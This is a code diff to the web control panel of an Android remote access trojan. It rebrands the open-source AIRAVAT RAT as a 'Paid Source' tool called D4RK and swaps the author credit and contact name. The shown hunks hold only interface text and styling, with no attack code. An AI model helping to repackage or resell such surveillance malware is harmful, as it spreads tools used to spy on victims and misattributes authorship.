@@ -193,7 +193,7 @@ if(aday()){
 document.body.appendChild(pd2);
 }
 
-pd3.innerHTML="<center> <h3 style='color:red'>•Notice•<h3> </center><br>This is an Open Source RAT named <b style='color:gold'>AIRAVAT </b>available for free on <a href='https://github.com/Th30neAnd0nly/AIRAVAT' style='color:#0f8;'>GitHub</a>. Reselling , Changing Brand Name , Logo  of free version are strictly prohibited.";
+pd3.innerHTML="<center> <h3 style='color:red'>•Notice•<h3> </center><br>This is an Paid Source RAT named <b style='color:gold'>D4RK </b>available for free on <a href='https://github.com/Th30neAnd0nly/AIRAVAT' style='color:#0f8;'>GitHub</a>. Reselling , Changing Brand Name , Logo  of free version are strictly prohibited.";
 pd3.innerHTML+="<br><center><button onclick='this.parentElement.parentElement.parentElement.style.display="+'"none"'+"' style='margin-top:5px;color:white;background:#001;border:1px solid red;border-radius:5px;height:30px;width:150px;margin-bottom:10px;'> I Understand</button><br><u style='color:red;font-size:15px;' onclick='dnd(this);'>Hide this notice for a day</u>";
 pd2.appendChild(pd3);
 function dnd(m){
@@ -212,7 +212,7 @@ pd1.style.color="#fff";
 pd1.style.textAlign="center";
 pd1.style.lineHeight="50px";
 pd1.style.border="1px solid #0f8";
-pd1.innerHTML="Want More Features Contact at <a href='https://t.me/th30neand0nly' style='color:#0f8;'>@th30neand0nly</a>";
+pd1.innerHTML="Want More Features Contact at <a href='https://t.me/th30neand0nly' style='color:#0f8;'>@Owner</a>";
 
 var pd=document.createElement("div");
 pd.style.height="20px";
@@ -224,9 +224,9 @@ pd.style.top="25px";
 pd.style.left="0";
 pd.style.zIndex="999999999999999999";
 pd.style.textAlign="center";
-pd.innerHTML="&copy; Prateek Chaubey";
+pd.innerHTML="&copy; Shubh";
 document.getElementById("tophead").appendChild(pd);
-$(".h4").text("AIRAVAT");
+$(".h4").text("D4RK");
 document.getElementById("phones").appendChild(pd1);
 
 function backk(o){
